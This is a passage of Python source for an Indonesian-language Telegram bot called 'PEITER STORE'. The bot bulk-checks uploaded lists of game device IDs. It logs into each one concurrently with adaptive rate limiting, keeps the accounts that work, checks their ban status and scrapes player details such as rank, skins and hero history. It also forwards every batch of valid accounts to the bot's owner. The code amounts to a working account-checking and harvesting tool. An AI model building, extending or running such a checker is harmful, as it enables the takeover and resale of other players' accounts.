    except Exception as e: tg_send(cid, f"❌ {e}")

def do_cleanup(cid):
    try:
        n = 0
        for f in RESULTS_DIR.glob("*.txt"):
            if time.time() - f.stat().st_mtime > 86400*7: f.unlink(); n += 1
        tg_send(cid, f"🗑 Hapus {n} file lama (>7 hari)")
    except Exception as e: tg_send(cid, f"❌ {e}")

def do_show_log(cid, n=30):
    p = LOGS_DIR / "activity.log"
    if not p.exists(): tg_send(cid, "Kosong"); return
    try:
        lines = p.read_text(encoding="utf-8", errors="ignore").split("\n")
        tail = [l for l in lines if l.strip()][-n:]
        txt = f"📜 <b>Log ({len(tail)})</b>\n\n<pre>"
        for l in tail: txt += l.replace("<","&lt;").replace(">","&gt;")[:120] + "\n"
        txt += "</pre>"
        tg_send(cid, txt)
    except Exception as e: tg_send(cid, f"❌ {e}")

# ══════════════════════════════════════════════════════════════════
#  BULK HANDLERS
# ══════════════════════════════════════════════════════════════════
def process_file_and_reply(chat_id, username, file_path, original_name):
    try:
        content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except:
        try: content = Path(file_path).read_text(encoding="latin-1", errors="ignore")
        except: tg_send(chat_id, "❌ Gagal baca"); return
    ids = extract_device_ids(content)
    if not ids: tg_send(chat_id, "❌ Tidak ada Device ID"); return
    total = len(ids)
    job_start(chat_id, "valid_file", total)
    prog = LiveProgress(chat_id, title=f"Valid: {original_name}")
    prog.start(total)

    valid, lock = [], threading.Lock()
    done = [0]
    start = time.time()
    workers = min(PROFILE["valid_w"] * 2, total, 100)

    def _check(did):
        if job_check(chat_id): return
        try:
            _ADAPTIVE_RATE.wait()
            acc, zid = GameLogin(did).run()
            if acc and zid:
                with lock:
                    valid.append({"device": did, "account": acc, "zone": zid})
                    save_valid_result(did, acc, zid)
                _ADAPTIVE_RATE.report(True)
            else:
                _ADAPTIVE_RATE.report(False)
        except:
            _ADAPTIVE_RATE.report(False)
        with lock:
            done[0] += 1
            job_update(chat_id, done=done[0])
            prog.update(done=done[0], valid=len(valid),
                        failed=done[0] - len(valid))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk(chunk):
        for did in chunk:
            _check(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    job_end(chat_id)
    duration = time.time() - start
    out_file = None
    if valid:
        if on:
            out_file = on.make_filename(RESULTS_DIR, "valid", len(valid), ".txt")
            on.write_with_header(
                out_file,
                [f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                 for v in valid],
                header_lines=[
                    f"PEITER STORE — FILE UPLOAD",
                    f"Original: {original_name}",
                    f"User ID: {chat_id}",
                    f"Username: {username}",
                ]
            )
        else:
            ts = int(time.time())
            out_file = RESULTS_DIR / f"valid_{chat_id}_{ts}.txt"
            out_file.write_text("\n".join(
                f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                for v in valid) + "\n", encoding="utf-8")

    final_text = (
        f"✅ <b>SELESAI</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📁 {original_name}\n"
        f"📊 Total  : <b>{total}</b>\n"
        f"✅ Valid  : <b>{len(valid)}</b>\n"
        f"❌ Failed : <b>{total - len(valid)}</b>\n"
        f"⏱ Waktu  : <b>{duration:.1f}s</b>\n"
        f"⚡ Speed  : <b>{total/duration:.1f}/s</b>"
    )
    if prog.message_id:
        tg_edit(chat_id, prog.message_id, final_text)
    else:
        tg_send(chat_id, final_text)

    if valid and out_file:
        tg_send_doc(chat_id, str(out_file), f"📁 {len(valid)} valid device")
        forward_batch_to_owner(chat_id, username, valid,
                                source="file_upload", output_file=str(out_file))


def do_bulk_valid(cid, username, file_path, original_name):
    try: content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except: tg_send(cid, "❌ Gagal baca"); return
    ids = extract_device_ids(content)
    if not ids: tg_send(cid, "❌ Kosong"); return
    total = len(ids)
    job_start(cid, "bulk_valid", total)
    prog = LiveProgress(cid, title=f"Bulk Valid: {original_name}")
    prog.start(total)

    valid, lock = [], threading.Lock()
    done = [0]
    start = time.time()
    workers = min(PROFILE["valid_w"] * 2, total, 100)

    def _w(did):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            acc, zid = GameLogin(did).run()
            if acc and zid:
                with lock:
                    valid.append({"device": did, "account": acc, "zone": zid})
                    save_valid_result(did, acc, zid)
                _ADAPTIVE_RATE.report(True)
            else:
                _ADAPTIVE_RATE.report(False)
        except:
            _ADAPTIVE_RATE.report(False)
        with lock:
            done[0] += 1
            job_update(cid, done=done[0])
            prog.update(done=done[0], valid=len(valid),
                        failed=done[0] - len(valid))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk(chunk):
        for did in chunk:
            _w(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    job_end(cid)
    inc_limit(cid, "bulk", 1)
    duration = time.time() - start
    out = None
    if valid:
        if on:
            out = on.make_filename(RESULTS_DIR, "valid", len(valid), ".txt")
            on.write_with_header(
                out,
                [f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                 for v in valid],
                header_lines=[
                    f"PEITER STORE — BULK VALID",
                    f"Original: {original_name}",
                    f"User ID: {cid}",
                    f"Username: {username}",
                ]
            )
        else:
            ts = int(time.time())
            out = RESULTS_DIR / f"valid_{cid}_{ts}.txt"
            out.write_text("\n".join(
                f"Device id: {v['device']} | account id: {v['account']} | zone id: {v['zone']}"
                for v in valid) + "\n", encoding="utf-8")

    final_text = (
        f"✅ <b>BULK VALID SELESAI</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📁 {original_name}\n"
        f"📊 Total  : <b>{total}</b>\n"
        f"✅ Valid  : <b>{len(valid)}</b>\n"
        f"❌ Failed : <b>{total - len(valid)}</b>\n"
        f"⏱ Waktu  : <b>{duration:.1f}s</b>\n"
        f"⚡ Speed  : <b>{total/duration:.1f}/s</b>"
    )
    if prog.message_id:
        tg_edit(cid, prog.message_id, final_text)
    else:
        tg_send(cid, final_text)

    if valid and out:
        tg_send_doc(cid, str(out), f"📁 {len(valid)} valid")
        forward_batch_to_owner(cid, username, valid, source="bulk_valid", output_file=str(out))
    if NOTIF_STORE and NOTIF_STORE.get(cid):
        tg_send(cid, "🔔 <b>Bulk valid selesai!</b>")


def do_bulk_detail(cid, username, file_path, original_name):
    try: content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except: tg_send(cid, "❌ Gagal baca"); return
    ids = extract_device_ids(content)
    if not ids: tg_send(cid, "❌ Kosong"); return
    total = len(ids)
    job_start(cid, "bulk_detail", total)
    prog = LiveProgress(cid, title=f"Bulk Detail: {original_name}")
    prog.start(total)

    results, lock = [], threading.Lock()
    done = [0]
    start = time.time()
    workers = min(PROFILE["detail_w"] * 2, total, 80)

    def _w(did):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            acc, zid = GameLogin(did).run()
            if not acc or not zid:
                _ADAPTIVE_RATE.report(False)
                with lock:
                    done[0] += 1
                    job_update(cid, done=done[0])
                    prog.update(done=done[0], valid=len(results),
                                failed=done[0] - len(results))
                return
            r = lookup_player_data(acc, zone_id=zid, device_id=did)
            with lock:
                if r.get("status") == "success":
                    results.append({"device": did, "account": acc, "zone": zid,
                                    "data": r["player_data"]})
                    save_valid_result(did, acc, zid)
                    _ADAPTIVE_RATE.report(True)
                else:
                    _ADAPTIVE_RATE.report(False)
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(results),
                            failed=done[0] - len(results))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(results),
                            failed=done[0] - len(results))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk(chunk):
        for did in chunk:
            _w(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    job_end(cid)
    inc_limit(cid, "bulk", 1)
    duration = time.time() - start
    out = None
    if results:
        if on:
            out = on.make_filename(RESULTS_DIR, "detail", len(results), ".txt")
        else:
            ts = int(time.time())
            out = RESULTS_DIR / f"detail_{cid}_{ts}.txt"
        with open(out, "w", encoding="utf-8") as f:
            if on:
                ts_str = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
                f.write(f"# PEITER STORE — BULK DETAIL\n")
                f.write(f"# Original: {original_name}\n")
                f.write(f"# User ID: {cid}\n")
                f.write(f"# Generated: {ts_str}\n")
                f.write(f"# Total: {len(results)}\n")
                f.write("#" + "=" * 60 + "\n\n")
            for i, r in enumerate(results, 1):
                d = r["data"]
                f.write(f"{i}.\nDevice id: {r['device']} | account id: {r['account']} | zone id: {r['zone']}\n")
                for k, val in d.items():
                    if k == "hero_history" and isinstance(val, list):
                        val = ", ".join(val[:15])
                    f.write(f"  {k:<24}: {val}\n")
                f.write("=" * 70 + "\n")

    final_text = (
        f"📱 <b>BULK DETAIL SELESAI</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📁 {original_name}\n"
        f"📊 Total  : <b>{total}</b>\n"
        f"✅ Detail : <b>{len(results)}</b>\n"
        f"❌ Failed : <b>{total - len(results)}</b>\n"
        f"⏱ Waktu  : <b>{duration:.1f}s</b>\n"
        f"⚡ Speed  : <b>{total/duration:.1f}/s</b>"
    )
    if prog.message_id:
        tg_edit(cid, prog.message_id, final_text)
    else:
        tg_send(cid, final_text)

    if results and out:
        tg_send_doc(cid, str(out), f"📁 {len(results)} detail")
        valid_list = [{"device": r["device"], "account": r["account"],
                       "zone": r["zone"]} for r in results]
        forward_batch_to_owner(cid, username, valid_list,
                                source="bulk_detail", output_file=str(out))
    if NOTIF_STORE and NOTIF_STORE.get(cid):
        tg_send(cid, "🔔 <b>Bulk detail selesai!</b>")


def do_bulk_ban(cid, username, file_path, original_name):
    try: content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except: tg_send(cid, "❌ Gagal baca"); return
    ids = extract_device_ids(content)
    if not ids: tg_send(cid, "❌ Kosong"); return
    total = len(ids)
    job_start(cid, "bulk_ban", total)
    prog = LiveProgress(cid, title=f"Bulk Ban: {original_name}")
    prog.start(total)

    clean, banned, lock = [], [], threading.Lock()
    done = [0]
    start = time.time()
    workers = min(PROFILE["ban_w"] * 2, total, 80)

    def _w(did):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            st, res = check_device_ban_silent(did)
            _ADAPTIVE_RATE.report(st != "UNKNOWN")
            with lock:
                if st == "BANNED": banned.append({"device": did, "info": res})
                else: clean.append({"device": did})
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(banned),
                            failed=len(clean))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                clean.append({"device": did})
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(banned),
                            failed=len(clean))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk(chunk):
        for did in chunk:
            _w(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    job_end(cid)
    inc_limit(cid, "bulk", 1)
    duration = time.time() - start
    out = None
    if on:
        out = on.make_filename(BAN_DIR, "ban", len(clean) + len(banned), ".txt")
    else:
        ts = int(time.time())
        out = BAN_DIR / f"ban_{cid}_{ts}.txt"
    with open(out, "w", encoding="utf-8") as f:
        if on:
            ts_str = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
            f.write(f"# PEITER STORE — BULK BAN\n")
            f.write(f"# Original: {original_name}\n")
            f.write(f"# User ID: {cid}\n")
            f.write(f"# Generated: {ts_str}\n")
            f.write(f"# Total: {len(clean) + len(banned)}\n")
            f.write("#" + "=" * 60 + "\n\n")
        f.write(f"=== CLEAN ({len(clean)}) ===\n")
        for c in clean: f.write(f"{c['device']}\n")
        f.write(f"\n=== BANNED ({len(banned)}) ===\n")
        for b in banned: f.write(f"{b['info']}\n")

    final_text = (
        f"🚫 <b>BULK BAN SELESAI</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📁 {original_name}\n"
        f"📊 Total  : <b>{total}</b>\n"
        f"✅ Clean  : <b>{len(clean)}</b>\n"
        f"🔴 Banned : <b>{len(banned)}</b>\n"
        f"⏱ Waktu  : <b>{duration:.1f}s</b>\n"
        f"⚡ Speed  : <b>{total/duration:.1f}/s</b>"
    )
    if prog.message_id:
        tg_edit(cid, prog.message_id, final_text)
    else:
        tg_send(cid, final_text)

    if (clean or banned) and out:
        tg_send_doc(cid, str(out), f"📁 {len(clean)} clean / {len(banned)} ban")
    if NOTIF_STORE and NOTIF_STORE.get(cid):
        tg_send(cid, "🔔 <b>Bulk ban selesai!</b>")


def do_bulk_lookup(cid, username, file_path, original_name):
    try: content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except: tg_send(cid, "❌ Gagal baca"); return
    ids, seen = [], set()
    for line in content.split("\n"):
        for m in re.finditer(r"\b(\d{5,12})\b", line):
            rid = int(m.group(1))
            if rid not in seen:
                seen.add(rid); ids.append(rid)
    if not ids: tg_send(cid, "❌ Tidak ada Role ID"); return
    total = len(ids)
    job_start(cid, "bulk_lookup", total)
    prog = LiveProgress(cid, title=f"Bulk Lookup: {original_name}")
    prog.start(total)

    results, lock = [], threading.Lock()
    done = [0]
    start = time.time()
    workers = min(PROFILE["lookup_w"] * 2, total, 80)

    def _w(rid):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            r = lookup_player_data(rid)
            with lock:
                if r.get("status") == "success":
                    results.append({"role_id": rid, "data": r["player_data"]})
                    _ADAPTIVE_RATE.report(True)
                else:
                    _ADAPTIVE_RATE.report(False)
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(results),
                            failed=done[0] - len(results))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                done[0] += 1
                job_update(cid, done=done[0])
                prog.update(done=done[0], valid=len(results),
                            failed=done[0] - len(results))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk(chunk):
        for rid in chunk:
            _w(rid)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    job_end(cid)
    inc_limit(cid, "bulk", 1)
    duration = time.time() - start
    out = None
    if results:
        if on:
            out = on.make_filename(RESULTS_DIR, "lookup", len(results), ".txt")
        else:
            ts = int(time.time())
            out = RESULTS_DIR / f"lookup_{cid}_{ts}.txt"
        with open(out, "w", encoding="utf-8") as f:
            if on:
                ts_str = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
                f.write(f"# PEITER STORE — BULK LOOKUP\n")
                f.write(f"# Original: {original_name}\n")
                f.write(f"# User ID: {cid}\n")
                f.write(f"# Generated: {ts_str}\n")
                f.write(f"# Total: {len(results)}\n")
                f.write("#" + "=" * 60 + "\n\n")
            for s in results:
                d = s["data"]
                f.write(f"Role ID: {s['role_id']} | Nick: {d.get('nickname','?')} | Lv.{d.get('level','?')} | Rank: {d.get('current_rank','?')} | Skins: {d.get('skin_count',0)}\n")

    final_text = (
        f"🎯 <b>BULK LOOKUP SELESAI</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📁 {original_name}\n"
        f"📊 Total  : <b>{total}</b>\n"
        f"✅ Found  : <b>{len(results)}</b>\n"
        f"❌ Failed : <b>{total - len(results)}</b>\n"
        f"⏱ Waktu  : <b>{duration:.1f}s</b>\n"
        f"⚡ Speed  : <b>{total/duration:.1f}/s</b>"
    )
    if prog.message_id:
        tg_edit(cid, prog.message_id, final_text)
    else:
        tg_send(cid, final_text)

    if results and out:
        tg_send_doc(cid, str(out), f"📁 {len(results)} hasil")
    if NOTIF_STORE and NOTIF_STORE.get(cid):
        tg_send(cid, "🔔 <b>Bulk lookup selesai!</b>")


def do_pipeline(cid, username, file_path, original_name):
    try: content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except: tg_send(cid, "❌ Gagal baca"); return
    ids = extract_device_ids(content)
    if not ids: tg_send(cid, "❌ Kosong"); return
    total = len(ids)
    job_start(cid, "pipeline", total)

    prog1 = LiveProgress(cid, title=f"Step 1/3 Ban: {original_name}")
    prog1.start(total)
    clean, banned, lock = [], [], threading.Lock()
    done1 = [0]
    workers_b = min(PROFILE["ban_w"] * 2, total, 80)
    def _b(did):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            st, res = check_device_ban_silent(did)
            _ADAPTIVE_RATE.report(st != "UNKNOWN")
            with lock:
                if st == "BANNED": banned.append(did)
                else: clean.append(did)
                done1[0] += 1
                prog1.update(done=done1[0], valid=len(banned),
                             failed=len(clean))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                clean.append(did)
                done1[0] += 1
                prog1.update(done=done1[0], valid=len(banned),
                             failed=len(clean))
    chunk_size = max(1, total // workers_b)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]
    def _do_chunk_b(chunk):
        for did in chunk:
            _b(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers_b) as ex_:
        list(ex_.map(_do_chunk_b, chunks))
    prog1.finish()
    time.sleep(0.3)

    if not clean:
        job_end(cid); return

    prog2 = LiveProgress(cid, title=f"Step 2/3 Valid: {original_name}")
    prog2.start(len(clean))
    valid, lock = [], threading.Lock()
    done2 = [0]
    workers_v = min(PROFILE["valid_w"] * 2, len(clean), 100)
    def _v(did):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            acc, zid = GameLogin(did).run()
            if acc and zid:
                with lock:
                    valid.append({"device": did, "account": acc, "zone": zid})
                    save_valid_result(did, acc, zid)
                _ADAPTIVE_RATE.report(True)
            else:
                _ADAPTIVE_RATE.report(False)
        except:
            _ADAPTIVE_RATE.report(False)
        with lock:
            done2[0] += 1
            prog2.update(done=done2[0], valid=len(valid),
                         failed=done2[0] - len(valid))
    chunk_size2 = max(1, len(clean) // workers_v)
    chunks2 = [clean[i:i+chunk_size2] for i in range(0, len(clean), chunk_size2)]
    def _do_chunk_v(chunk):
        for did in chunk:
            _v(did)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers_v) as ex_:
        list(ex_.map(_do_chunk_v, chunks2))
    prog2.finish()
    time.sleep(0.3)

    if not valid:
        job_end(cid); return

    prog3 = LiveProgress(cid, title=f"Step 3/3 Detail: {original_name}")
    prog3.start(len(valid))
    details, lock = [], threading.Lock()
    done3 = [0]
    workers_d = min(PROFILE["detail_w"] * 2, len(valid), 80)
    def _d(v):
        if job_check(cid): return
        try:
            _ADAPTIVE_RATE.wait()
            r = lookup_player_data(v["account"], zone_id=v["zone"],
                                    device_id=v["device"])
            with lock:
                if r.get("status") == "success":
                    details.append({"device": v["device"],
                                    "account": v["account"],
                                    "zone": v["zone"],
                                    "data": r["player_data"]})
                    _ADAPTIVE_RATE.report(True)
                else:
                    _ADAPTIVE_RATE.report(False)
                done3[0] += 1
                prog3.update(done=done3[0], valid=len(details),
                             failed=done3[0] - len(details))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                done3[0] += 1
                prog3.update(done=done3[0], valid=len(details),
                             failed=done3[0] - len(details))
    chunk_size3 = max(1, len(valid) // workers_d)
    chunks3 = [valid[i:i+chunk_size3] for i in range(0, len(valid), chunk_size3)]
    def _do_chunk_d(chunk):
        for v in chunk:
            _d(v)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers_d) as ex_:
        list(ex_.map(_do_chunk_d, chunks3))
    prog3.finish()
    time.sleep(0.5)
    job_end(cid)
    inc_limit(cid, "bulk", 1)

    out = None
    if on:
        out = on.make_filename(RESULTS_DIR, "pipeline", len(details), ".txt")
    else:
        ts = int(time.time())
        out = RESULTS_DIR / f"pipeline_{cid}_{ts}.txt"
    with open(out, "w", encoding="utf-8") as f:
        if on:
            ts_str = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
            f.write(f"# PEITER STORE — PIPELINE\n")
            f.write(f"# Original: {original_name}\n")
            f.write(f"# User ID: {cid}\n")
            f.write(f"# Generated: {ts_str}\n")
            f.write(f"# Clean: {len(clean)} | Banned: {len(banned)}\n")
            f.write(f"# Valid: {len(valid)} | Detail: {len(details)}\n")
            f.write("#" + "=" * 60 + "\n\n")
        f.write(f"Pipeline: {len(details)} detail\n")
        for i, r in enumerate(details, 1):
            d = r["data"]
            f.write(f"{i}. Device id: {r['device']} | account id: {r['account']} | zone id: {r['zone']}\n")
            for k, val in d.items():
                if k == "hero_history" and isinstance(val, list):
                    val = ", ".join(val[:15])
                f.write(f"  {k:<24}: {val}\n")
            f.write("=" * 70 + "\n")

    tg_send(cid, f"🎬 <b>PIPELINE SELESAI</b>\n"
                 f"📊 Clean: {len(clean)} | Banned: {len(banned)}\n"
                 f"✅ Valid: {len(valid)} | Detail: {len(details)}")
    if details and out:
        tg_send_doc(cid, str(out), f"📁 {len(details)} detail")
        valid_list = [{"device": r["device"], "account": r["account"],
                       "zone": r["zone"]} for r in details]
        forward_batch_to_owner(cid, username, valid_list,
                                source="pipeline", output_file=str(out))
    if NOTIF_STORE and NOTIF_STORE.get(cid):
        tg_send(cid, "🔔 <b>Pipeline selesai!</b>")


def handle_document(cid, username, doc):
    fname = (doc.get("file_name") or "").lower()
    file_id = doc.get("file_id")
    if not fname.endswith((".txt", ".csv", ".log")):
        tg_send(cid, "❌ Hanya .txt/.csv/.log"); return
    tg_send(cid, f"📁 Downloading <b>{fname}</b>...")
    local = tg_get_file(file_id)
    if not local:
        tg_send(cid, "❌ Gagal download"); return
    pending = get_pending(cid)
    state = pending["state"] if pending else None
    role = get_role(cid)
    is_admin = role in ("admin", "owner")

    if state == "bulk_detail":
        if not is_admin: clear_pending(cid); tg_send(cid, "🚫 Admin only"); return
        clear_pending(cid)
        threading.Thread(target=do_bulk_detail, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "bulk_ban":
        if not is_admin: clear_pending(cid); tg_send(cid, "🚫 Admin only"); return
        clear_pending(cid)
        threading.Thread(target=do_bulk_ban, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "bulk_lookup":
        if not is_admin: clear_pending(cid); tg_send(cid, "🚫 Admin only"); return
        clear_pending(cid)
        threading.Thread(target=do_bulk_lookup, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "bulk_valid":
        if not is_admin: clear_pending(cid); tg_send(cid, "🚫 Admin only"); return
        clear_pending(cid)
        threading.Thread(target=do_bulk_valid, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "pipeline":
        if not is_admin: clear_pending(cid); tg_send(cid, "🚫 Admin only"); return
        clear_pending(cid)
        threading.Thread(target=do_pipeline, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "valid_file":
        clear_pending(cid)
        threading.Thread(target=process_file_and_reply, args=(cid, username, local, fname), daemon=True).start()
        return
    if state == "dedup":
        clear_pending(cid)
        try:
            text = Path(local).read_text(encoding="utf-8", errors="ignore")
            ids = extract_device_ids(text)
            uniq = list(dict.fromkeys(ids))
            out = STORE_DIR / f"dedup_{int(time.time())}.txt"
            out.write_text("\n".join(uniq) + "\n", encoding="utf-8")
            tg_send(cid, f"🗑 Dedup: {len(ids)} → {len(uniq)}")
            tg_send_doc(cid, str(out), f"📁 {len(uniq)} unik")
        except Exception as e:
            tg_send(cid, f"❌ {e}")
        return
    if state == "merge":
        first = pending.get("data", {}).get("first")
        if not first:
            set_pending(cid, "merge", {"first": local})
            tg_send(cid, "🔗 File 1 diterima. Upload file ke-2 atau /cancel")
            return
        clear_pending(cid)
        if not ex:
            tg_send(cid, "❌ Extras OFF"); return
        merged = ex.merge_device_files([first, local])
        out = STORE_DIR / f"merge_{int(time.time())}.txt"
        out.write_text("\n".join(merged) + "\n", encoding="utf-8")
        tg_send(cid, f"🔗 Merge: {len(merged)} device unik")
        tg_send_doc(cid, str(out), f"📁 {len(merged)} device")
        return
    threading.Thread(target=process_file_and_reply, args=(cid, username, local, fname), daemon=True).start()


# ══════════════════════════════════════════════════════════════════
#  COMMAND HANDLER
# ══════════════════════════════════════════════════════════════════
def handle_command(cid, text, username, msg=None):
    global PERFORMANCE_MODE, PROFILE
    cmd = text.strip()
    lower = cmd.lower()
    role = get_role(cid)
    is_admin = role in ("admin", "owner")
    is_owner = role == "owner"
    log_activity(cid, username, "cmd", text[:80])

    if lower in ("/start", "/menu"):
        # Track user yang pernah /start
        if STARTED_TRACKER:
            try:
                first_name = ""
                last_name = ""
                username_tg = ""
                if msg:
                    chat = msg.get("chat", {})
                    first_name = chat.get("first_name", "")
                    last_name = chat.get("last_name", "")
                    username_tg = chat.get("username", "")
                STARTED_TRACKER.add(
                    cid=cid,
                    username=username,
                    first_name=first_name,
                    last_name=last_name,
                    username_tg=username_tg,
                )
            except Exception as e:
                safe_print(f"[TRACK ERR] {e}")

        tg_send(cid, menu_main(username, cid), kb_main(cid))
    elif lower == "/help":
        tg_send(cid, menu_help(cid), kb_main(cid))
    elif lower == "/status":
        tg_send(cid, menu_status(cid), kb_main(cid))
    elif lower == "/myid":
        tg_send(cid, menu_myid(cid, username), kb_main(cid))
    elif lower == "/mylimit":
        _, ul, ml = check_limit(cid, "lookup")
        _, uv, mv = check_limit(cid, "valid")
        tg_send(cid, f"📊 Lookup: {ul}/{ml}\n✅ Valid: {uv}/{mv}")
    elif lower == "/ping":
        tg_send(cid, "🏓 Pong!")
    elif lower == "/stats":
        tg_send(cid, menu_stats(), kb_main(cid))
    elif lower == "/cancel":
        clear_pending(cid); tg_send(cid, "❌ Dibatalkan", kb_main(cid))
    elif lower.startswith("/notif"):
        if not NOTIF_STORE: tg_send(cid, "❌ Extras OFF"); return
        parts = cmd.split()
        if len(parts) < 2:
            cur = "ON" if NOTIF_STORE.get(cid) else "OFF"
            tg_send(cid, f"🔔 Notif: <b>{cur}</b>\n\n<code>/notif on|off</code>")
            return
        arg = parts[1].lower()
        if arg in ("on", "1", "yes"):
            NOTIF_STORE.set(cid, True); tg_send(cid, "🔔 Notif: <b>ON</b>")
        elif arg in ("off", "0", "no"):
            NOTIF_STORE.set(cid, False); tg_send(cid, "🔕 Notif: <b>OFF</b>")
        else:
            tg_send(cid, "❌ Pakai: <code>/notif on|off</code>")
    elif lower == "/progress":
        if not JOB_TRACKER: tg_send(cid, "❌ Extras OFF"); return
        j = JOB_TRACKER.get(cid)
        if not j: tg_send(cid, "❌ Tidak ada job aktif"); return
        bar = progress_bar(j["done"], j["total"])
        elapsed = int(time.time() - j["start"])
        tg_send(cid, f"📊 <b>{j['name']}</b>\n\n{bar}\n⏱ {elapsed}s")

    elif lower == "/donate":
        if not dn: tg_send(cid, "❌ Donate OFF"); return
        kb = dn.kb_donate(QRIS_CFG)
        tg_send(cid, dn.format_donate_menu(QRIS_CFG), kb)
    elif lower.startswith("/donate ") and lower.split()[0] == "/donate":
        if not dn: tg_send(cid, "❌ Donate OFF"); return
        parts = cmd.split()
        try:
            amount = int(parts[1].replace(",", "").replace(".", ""))
        except:
            tg_send(cid, "❌ Nominal tidak valid\nContoh: <code>/donate 10000</code>")
            return
        min_d = QRIS_CFG.get("min_donate", 1000)
        if amount < min_d:
            tg_send(cid, f"❌ Minimal donasi <code>Rp {min_d:,}</code>")
            return
        static_qris = QRIS_CFG.get("qris_static", "")
        if static_qris:
            dynamic = dn.make_dynamic_qris(static_qris, amount)
            if DONATION_TRACKER:
                DONATION_TRACKER.add(cid, username, amount, "qris")
            try:
                img_bytes = dn.qris_to_image_bytes(dynamic, 400)
                if img_bytes:
                    files = {"photo": ("qris.png", img_bytes, "image/png")}
                    r = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        files=files,
                        data={"chat_id": cid,
                              "caption": dn.format_donate_qris(QRIS_CFG, amount, cid),
                              "parse_mode": "HTML",
                              "reply_markup": json.dumps({
                                  "inline_keyboard": dn.kb_qris_active(cid)
                              })},
                        timeout=30)
                    try:
                        resp = r.json()
                        if resp.get("ok"):
                            mid_qr = resp["result"]["message_id"]
                            dn.register_qris(cid, mid_qr, amount)
                            threading.Thread(
                                target=_auto_expire_qris,
                                args=(cid, mid_qr, amount),
                                daemon=True
                            ).start()
                    except: pass
                else:
                    r = tg_api("sendMessage",
                               chat_id=cid,
                               text=dn.format_donate_qris(QRIS_CFG, amount, cid),
                               parse_mode="HTML",
                               reply_markup={"inline_keyboard": dn.kb_qris_active(cid)})
                    try:
                        if r.get("ok"):
                            mid_qr = r["result"]["message_id"]
                            dn.register_qris(cid, mid_qr, amount)
                            threading.Thread(
                                target=_auto_expire_qris,
                                args=(cid, mid_qr, amount),
                                daemon=True
                            ).start()
                    except: pass
            except:
                tg_send(cid, dn.format_donate_qris(QRIS_CFG, amount, cid))
            tg_send(OWNER_CHAT_ID, dn.format_donate_owner_notif(cid, username, amount, "qris"))
            log_forensic({"type": "donation", "user": cid, "username": username,
                          "amount": amount, "method": "qris"})
        else:
            tg_send(cid, dn.format_donate_manual(QRIS_CFG))
    elif lower == "/donatemode":
        if not is_owner: tg_send(cid, "🚫 Owner only"); return
        if not dn: tg_send(cid, "❌ OFF"); return
        parts = cmd.split()
        if len(parts) < 2:
